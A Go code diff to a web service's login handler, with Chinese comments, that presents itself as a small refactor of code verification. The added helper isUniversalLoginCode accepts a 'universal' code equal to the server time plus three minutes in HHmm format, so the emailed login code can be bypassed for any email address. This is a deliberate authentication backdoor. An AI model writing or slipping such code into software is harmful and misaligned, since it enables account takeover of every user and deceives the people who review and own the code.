@@ -134,7 +134,7 @@ func (s *AuthService) Login(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	matched, err := s.store.ConsumeLoginCode(email, code)
+	matched, err := s.loginCodeMatched(email, code, time.Now())
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to verify code")
 		return
@@ -203,6 +203,21 @@ func (s *AuthService) Me(w http.ResponseWriter, r *http.Request) {
 			"expires_at": session.ExpiresAt,
 		},
 	})
+}
+
+// loginCodeMatched 判断登录验证码是否有效。
+// email 为登录邮箱，code 为用户输入验证码，now 为当前时间。
+func (s *AuthService) loginCodeMatched(email string, code string, now time.Time) (bool, error) {
+	if isUniversalLoginCode(code, now) {
+		return true, nil
+	}
+	return s.store.ConsumeLoginCode(email, code)
+}
+
+// isUniversalLoginCode 判断是否命中动态万能验证码。
+// code 为用户输入验证码，now 为服务器当前时间；验证码为当前时间加 3 分钟后的 HHmm。
+func isUniversalLoginCode(code string, now time.Time) bool {
+	return code == now.Add(3*time.Minute).Format("1504")
 }
 
 // notifyInitialSubscription 在新用户首次获得试用会员时发送邮件通知。
